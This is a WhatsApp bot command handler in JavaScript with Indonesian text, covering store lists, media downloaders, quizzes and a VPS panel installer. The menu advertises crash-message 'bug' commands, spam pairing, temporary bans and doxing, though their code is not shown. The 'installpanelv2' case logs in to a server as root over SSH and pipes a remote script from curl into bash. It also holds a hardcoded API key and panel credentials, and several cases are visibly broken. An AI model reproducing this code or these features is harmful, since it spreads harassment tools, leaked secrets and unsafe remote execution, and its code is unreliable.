let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}



//==================《 FUNCTION RESPON SALAH 》======================\\
if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
m.reply(response)
}}
    Lily.tebakkata = Lily.tebakkata ? Lily.tebakkata : {}  
if (from in Lily.tebakkata) {
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Lily.tebakkata[id][1]))
kuis = true
if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
 users.money += 10000
 var teks = `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n`
 reply(`${teks}`)
 clearTimeout(Lily.tebakkata[id][2])
 delete Lily.tebakkata[id]
} else console.log('*Jawaban Salah!*')
}
Lily.tebakgambar = Lily.tebakgambar ? Lily.tebakgambar : {} 
if(from in Lily.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.users[m.sender]
let json = JSON.parse(JSON.stringify(Lily.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   users.money += 10000
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : 10.000 money\n\nIngin bermain lagi? Silahkan Ketik TebakGambar`
 reply(`${teks}`)
 clearTimeout(Lily.tebakgambar[id][3])
 delete Lily.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}

//=================《 TEMPAT CASE DI BAWAH INI 》=================\\
switch(command) {


case 'menu': case 'help': case 'allmenu': case 'Lily':{
Lily.sendMessage(from, {react: {text: "🌊", key: m.key}})
let anu = `┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ INFO BOT* ]
> ɴᴀᴍᴀ   : ʜɪʟʟᴀʀʏ ᴍᴅ
> ᴏᴡɴᴇʀ  : ʜɪʟʟᴀʀʏ
> ᴠᴇʀꜱɪ   : ᴠ 0.0.1 ʙᴇᴛᴀ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU STORE* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> • list
> • addlist
> • dellist
> • updatelist
> • setproses
> • changeproses
> • delsetproses
> • setdone
> • changedone
> • delsetdone
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU AI* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> • luminai
> • lily
> • blackboxai 
> • ai-fall 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU OWNER* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> • self
> • public
> • sc
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU DOWNLOAD* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> • youtube
> • tiktok
> • instagram
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU BUG* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> bug-button
> bug-browser
> bug-gc
> penghitaman
> bug-android
> virg4m
> ga-ngotak
> 1day-out
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU BUG JKT48* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> bantai-wotabul
> kebal-tubiran
> mampuslu-zombie
> wotabul-kontol
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU NEW* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> • tozombie 
> • cekoshi
> • longtext 
> • sendch 
> • gacha-member 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ MENU RPG* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> joinrp
> buygumption
> ceklimitrp
> heal
> gumtion
> crystal
> healing
> myhost
> inventori
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ VIP MENU * ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> tempban ( New Feature )
> oneshot ( New Features )
> spamPairing ( warning.js )
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ WARNING !! * ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> doxing ( Bonus Features !! )
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> © ʜɪʟᴀʀʏ ᴀʙɪɢᴀɪʟ
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
LilyReply(anu)
 }
        break
case 'bot': {
  reply(`${global.botname} Aktif boss...`)
}
break

case 'p': {
  reply(`Halo Kak ${pushname} , Hendaknya Mengucapkan Salam`)
}
break;


//===================《 TEMPAT CASE MENU STORE 》=====================\\
case 'list': case 'store': {
	Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
	if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
	if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
	let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
	for (let i of db_respon_list) {
		if (i.id === m.chat) {
			teks += `- ${i.key.toUpperCase()}\n`
		}
	}
	teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
	Lily.sendMessage(m.chat, {
		text: teks,
		mentions: [m.sender]
	}, {
		quoted: m
	})
}
        break
case 'owner': {
let name = m.pushName || Lily.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *Halo Kak \`${name}\`, Tekan Tombol Yang bertuliskan Chat Owner Untuk Menghubungi Nomor Owner ku*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = `${global.thumbnail}`;
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Lily.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  imageMessage: await image(url),
                  hasMediaAttachment: true,
                },
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.pembuat} ]\`* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"👤 Chat Owner ( ${global.pembuat} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
                    },
                  ],
                },
              },
              {
                header: {
                  imageMessage: await image(url),
                  hasMediaAttachment: true,
                },
                body: {
                  text: `
┏───────────────┈ 
┆     「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆ • Jangan Spam Bot
┆ • Jangan Telpon/Call Bot 
┆ • Gaudah Chat Yg Aneh Aneh
┆ • Beli Prem Dll Chat Owner
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  💬  Chat Bot ( ${botname} )","url":"https://wa.me/${global.botnumber}","merchant_url":"https://wa.me/${global.botnumber}"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Lily.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
        break 
    case 'spotify':{
    if (!text) await reply('link nya mana nih')    
    try {    
    const xyonz = fetchJson(`https://api.xyzen.tech/api/downloader/spotify?url=${text}&apikey=e17b52e22b35a080`)   
    let te = ` 
┌─⊷ *SPORTY DOWNLOAD *
> Description: ${xyonz.data}
> title: ${xyonz.title}
> artis : ${xyonz.artist}
> duration : ${xyonz.duration}
└───────────`
        Lily.sendMessage(m.chat, {audio: xyonz.download, caption: te}, {quoted: m})                  
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
}
break 
    case 'gacha-member': {
    let anu = await fetch("https://raw.githubusercontent.com/FallEzz/cekoshi/master/oshi.json")
    let data = await anu.json()
    let selected = data[Math.floor(Math.random() * data.length)]
    await Lily.sendMessage(m.chat, {
        image: { url: selected.image },
        caption: selected.name
    })
    }
        break
//================================================================
case 'tebakjkt48': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in Lily.tebakgambar) return reply("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/FallEzz/JKT48/main/JKT48fitur.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 Lily.tebakgambar[id] = [
    await Lily.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,   
 setTimeout(() => {
	if (Lily.tebakgambar[id])
 reply(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete Lily.tebakgambar[id]
 }, 60000)
	 ]
}
        await reply(m.chat, "Benar", m, {
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          title: "JAWABAN Benar",
          renderLargerThumbnail: false,
          thumbnailUrl: "https://cdn-icons-png.flaticon.com/128/11378/11378648.png"
        }
      }
    })
break
//=========================\\
case 'addlist':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
	let media = await Lily.downloadAndSaveMediaMessage(quoted)
	const fd = new FormData();
	fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
	fetch('https://telegra.ph/upload', {
			method: 'POST',
			body: fd
		}).then(res => res.json())
		.then((json) => {
			addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
			reply(`Sukses set list message dengan key : *${args1}*`)
			if (fs.existsSync(media)) fs.unlinkSync(media)
		})
} else {
	addResponList(m.chat, args1, args2, false, '-', db_respon_list)
	reply(`Sukses set list message dengan key : *${args1}*`)
}
break
//=========================\\
case 'dellist':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
//=========================\\
case 'updatelist': case 'update':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
	let media = await Lily.downloadAndSaveMediaMessage(quoted)
	const fd = new FormData();
	fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
	fetch('https://telegra.ph/upload', {
			method: 'POST',
			body: fd
		}).then(res => res.json())
		.then((json) => {
			updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
			reply(`Sukses update respon list dengan key *${args1}*`)
			if (fs.existsSync(media)) fs.unlinkSync(media)
		})
} else {
	updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
	reply(`Sukses update respon list dengan key *${args1}*`)
}
break
//=========================\\
case 'setproses': case 'setp':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`✅ Done set proses!`)
break
//=========================\\
case 'changeproses': case 'changep':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
	changeSetProses(text, m.chat, set_proses)
	reply(`Sukses ubah set proses!`)
} else {
	addSetProses(text, m.chat, set_proses)
	reply(`Sukses ubah set proses!`)
}
break
//=========================\\
case 'delsetproses': case 'delsetp':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
reply(`Sukses delete set proses`)
break
//=========================\\
case 'setdone': {
	Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
	if (!m.isGroup) return reply('Fitur Khusus Group!')
	if (!isAdmins) return reply('Fitur Khusus admin!')
	if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
	if (isSetDone(m.chat, set_done)) return reply(`Udh set done sebelumnya`)
	addSetDone(text, m.chat, set_done)
	reply(`Sukses set done!`)
}
        /*SUMBER SHARE https://whatsapp.com/channel/0029VabMRfKDJ6H1y5xfgj2s

https://whatsapp.com/channel/0029Vagk8AMKrWR5wAmiq745
GK USH TEMPEL WM MU CIK*/
//[ *FITUR INSTALL PANEL NO TOKEN* ]

case 'installpanelv2':{
if (!isCreator) return ('Fitur Khusus Owner')
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domain`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};
let password = generateRandomPassword()

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
conn.on('ready', () => {
          m.reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('0\n');
          }

          if (data.toString().includes('Input')) {
            stream.write('\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('ruztanxd\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('ruztan@gmail.com\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('ruztan@gmail.com\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('ruztanxd\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('adm\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('adm\n');
          }
          if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
          }
          if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('yes\n');
          }
       
         if (data.toString().includes('Please read the Terms of Service')) {
                stream.write('A\n');
            }
          if (data.toString().includes('Input')) {
            stream.write('\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('1\n');
          }
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 600000));
if (isSuccess) {
            m.reply('`SUKSES INSTALL PANEL & WINGS DATA AKAN DI KIRIM BENTAR LAGI`');
        }
  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender], 
            isForwarded: false, 
            forwardedNewsletterMessageInfo: {
              newsletterJid: idsaluran,
              serverMessageId: -1
            },
            businessMessageForwardInfo: { businessOwnerJid: Lily.decodeJid(Lily.user.id) },
          }, 
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*DATA PANEL ANDA*\n\n*USERNAME:* ruztanxd\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: *JANGAN LUPA CREATE MANUAL NODE NYA OM HBS ITU GET APIKEY NYA TRUS KETIL .installwings*`
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [ 
              {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"ruztanxd\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
  {
                "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://www.google.com\"}`
              }
              
            ]
          })
        })
      }
    }
  }, {})

  await Lily.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
  }
break
//=========================\\
case 'changedone': case 'changed':
Lily.sendMessage(from, {
	react: {
		text: "🌊",
		key: m.key
	}
})
if (!m.isGroup) return reply('Fitur Khusus Group!')
if (!isAdmins) return reply('Fitur Khusus admin!')
if (!text) return reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
	changeSetDone(text, m.chat, set_done)
	reply(`Sukses ubah set done!`)
} else {
	addSetDone(text, m.chat, set_done)
	reply(`Sukses ubah set done!`)
}
        break
    case 'ngl': {
        if (!text) return reply(`masukan command ${prefix} user|text`)
        try {
        const url = fetchJson(`https://ngl.link/${text}`)
        const result = await Lily.sendMessage(url, m)
        await m.reply(`Berhasil mengirim NGL ke *"${text}"*\nPesan: *"${msg}"*\nLihat hasil: ${result}`)
          } catch (err) {
    await reply(`Gagal mengirim pesan: ${err.message}`)
          }
}
        break 
    case 'cek-oshi': {
    if (!text) return reply('masukan namamu')
    const name = args.join(" ")
    const puppeteer = require('puppeteer')
    const browser = await puppeteer.launch({ headless: true })
    const page = await browser.newPage()
    await page.goto('https://oshi-fall.vercel.app')
    await page.type('#nameInput', name)
    await page.click('#cekButton')
    await page.waitForSelector('#oshiName')
    const oshiName = await page.$eval('#oshiName', el => el.innerText)
    const imageUrl = await page.$eval('#oshiImage', el => el.src)
        await browser.close()
    await Lily.sendFile(m.chat, imageUrl, 'image.jpg', `Nama: ${name}\nOshi: ${oshiName}`, m)
    }
        break 
    case 'kapanlibur': {
    Lily.sendMessage(from, {
        react : {
            text: '🌊',
            key: m.key
        }
    })
    const { nextLibur, libnas_content } = await HariLibur()
    let caption = reply(`*\`Hari Libur Nasional Berikutnya\`*\n\n🎉 ${nextLibur}\n\n*Daftar Hari Libur Nasional:*`)
    caption += libnas_content.map(item => `
    Memperingati: *${item.summary}*
    Tanggal: *${item.dateMonth}*
    Hari: *${item.days}*\n`).join("")
    await reply(m.chat ,caption, m)
    }
   break
case 'sendch': {
    if (!m.quoted) return reply(`Reply audio ${prefix}${command}`)
    if (isAudio || !isQuotedAudio) {
        try {
            reply('Done')
            let media = await m.quoted.download();
            Lily.sendMessage(global.idsaluran, { audio: media }, { quoted: m })
        } catch (err) {
            reply(`Audio tidak ditemukan!\nCoba untuk ulangi kirim/reply audio`)
        }
    } else {
        reply(`Reply audio`)
    }
}
        break
    case 'longtext': {
        try {
    const response = await fetch('https://cylic.vercel.app/data.json')
            if (!response.ok) {
            throw new Error('Network response was not ok')
            }
        let data = await response.text()
        data = JSON.parse(data)
        const texts = data.texts
        if (texts.length > 0) {
            const randomText = texts[Math.floor(Math.random() * texts.length)]
            await reply(m.chat, `"${randomText}"`, m)
        } else {
            await reply(m.chat, 'No texts found', m)
        }
        } catch (error) {
        await reply(m.chat, `Error: ${error.message}`, m)
    }
    }
    
    break;

/**
`SUMBER`
https://whatsapp.com/channel/0029Vai9MMj5vKABWrYzIJ2Z
*/
//==================《 DOWNLOADER CASE 》======================\\
break
//=========================================\\
case 'tiktok':
case 'tt': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
  if (!text) return m.reply(`Contoh: ${prefix + command} link`);
  reply(mess.wait);
      try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`);
    const stats = data.result.statistics;
const caption = `┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
> [ *⎙ TIKTOK DOWNLOAD* ]
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
    const vidnya = data.result.video;
    Lily.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
} catch (error) {
    const anub = await fetchJson(`${api.xterm.url}/api/downloader/tiktok?url=${url}&key=${api.xterm.key}`);
    const syavid = anub.data.video;
    Lily.sendMessage(m.chat, { caption: mess.success, video: { url: syavid } }, { quoted: m });
}
}
        break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!text) return reply('mana linknya cuy')
    try {
    const response = fetch(`https://widipe.com/download/twtdl?url=${text}`)
    const data = await response.result;
    let te = ` 
┌─⊷ *TWITTER DL*
▢ title: ${response.title}
└───────────`
Lily.sendMessage(m.chat, {image: {url:data}, caption: te}, {quoted: m})
} catch (e) {
  	reply('Verify that the link is from Twitter')
	}
}
break
//=========================================\\
case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
Lily.sendMessage(from, {
		react: {
			text: "🌊",
			key: m.key
		}
	})
	  if (!text) return m.reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return m.reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return m.reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: Lily.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: pembuat,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Lily.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: Lily.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Nice ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363186130999681@newsletter',
                  newsletterName: pembuat,
                  serverMessageId: 143
                }
                }
       })
    }
